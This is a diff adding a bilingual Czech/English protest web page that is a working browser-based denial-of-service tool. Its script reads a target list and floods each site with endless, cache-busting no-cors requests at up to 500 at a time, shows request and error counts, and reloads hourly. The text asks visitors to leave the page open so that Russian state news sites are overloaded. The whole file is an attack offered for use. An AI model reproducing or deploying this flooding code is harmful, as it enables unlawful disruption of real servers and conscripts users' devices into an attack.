@@ -1,0 +1,100 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <title>Putin musí být zastaven! – Putin must be stopped</title>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RM2JZ4FQQJ"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RM2JZ4FQQJ');
+    </script>
+</head>
+<body>
+  <h1>PUTIN MUST BE STOPPED! – PUTIN MUSÍ BÝT ZASTAVEN!</h1>
+  <h3>Česká verze</h3>
+  <p>„Oficiální“ zpravodajství ruské federace lže a my věříme, že je lepší ho vypnout.<br />
+  Nechte otevřenou tuto stránku ve svém prohlížeči a váš prohlížeč bude opakovaně dotazovat weby ze seznamu níže. Pokud nás bude dost, weby přetížíme a tím vlastně „vypneme“.</p>
+  <p>DOPLNĚNÍ: Prosím vás, přátelé, nepodléhejte opojné představě, že poté, co si tuto stránku spustíte, začne se z cílových serverů kouřit a Putin se počne kroutit jak pod kletbou Cruciatus. Obrana proti tomuto triviálnímu útoku je také poměrně triviální. Nicméně vyžaduje udělat nějakou akci. A čím víc lidí tuhle stránku otevře, tím víc akcí bude potřeba (i když ne přímo úměrně). Stránka nedělá nic jiného, než že z vašeho prohlížeče opakovaně posílá dotazy na weby v seznamu (proto se nemusí líbit antivirům), které tak musí odpovídat (za předpokladu, že dotaz není odchycen nějakým „protifiltrem“ po cestě a dostane se na server), což je zatěžuje. To, že se vám server jeví po chvíli jako nedostupný, neznamená, že jste jej vyhackovali/upirátili/shodili/znemožnili/..., ale s největší pravděpodobností pouze to, že váš pokus byl odhalen a server před vámi „odstíněn“.</p>
+  <h3>English version</h3>
+  <p>The "official" news in russian federation are all fake and we believe it is better to shut them down!<br />
+  Please, just open this page and let it be open on your devices, it will flood the web-sites and pose a huge load on their infrastructure</p>
+  <h3>Vaše statistika / your stats</h3>
+  <div id="stats"></div>
+  <div id="errors"></div>
+  <p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine conflict: Russian forces attack from three sides</a></p>
+  <p>Credits: <a href="https://vug.pl/takeRussiaDown.html">https://vug.pl/takeRussiaDown.html</a></p>
+  <p id="refreshed"></p>
+</body>
+<script>
+  var targets = {};
+
+  async function get_targets() {
+    targets = (await (await fetch ("targets.txt")).text()).split("\n");
+    targets  = targets.reduce((acc, e) =>
+      {
+        if (!/https?:\/\//.test(e)) {
+          e = 'https://' + e;
+        }
+        return {[e]: {number_of_errored_responses: 0, number_of_requests: 0}, ...acc};
+      }, {});
+  }
+
+  var statsEl = document.getElementById('stats');
+  function printStats() {
+    statsEl.innerHTML = '<table width="100%"><thead><tr><th>Web</th><th>Počet dotazů/Number of Requests</th><th>Počet chyb/Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  }
+  setInterval(printStats, 1000);
+
+  var CONCURRENCY_LIMIT = 500
+  var queue = []
+
+  async function fetchWithTimeout(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    return fetch(resource, {
+      method: 'GET',
+      mode: 'no-cors',
+      signal: controller.signal
+    }).then((response) => {
+      clearTimeout(id);
+      return response;
+    }).catch((error) => {
+      clearTimeout(id);
+      throw error;
+    });
+  }
+
+  async function flood(target) {
+    for (var i = 0;; ++i) {
+      if (queue.length > CONCURRENCY_LIMIT) {
+        await queue.shift()
+      }
+      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
+      queue.push(
+        fetchWithTimeout(target+rand, { timeout: 1000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            targets[target].number_of_errored_responses++;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              targets[target].number_of_errored_responses++;
+            }
+            targets[target].number_of_requests++;
+          })
+
+      )
+    }
+  }
+
+  // Start
+  document.getElementById('refreshed').innerHTML = Date();
+  setInterval(() => {location.reload();}, 3600000);
+  get_targets().then(() => {Object.keys(targets).map(flood)});
+</script>
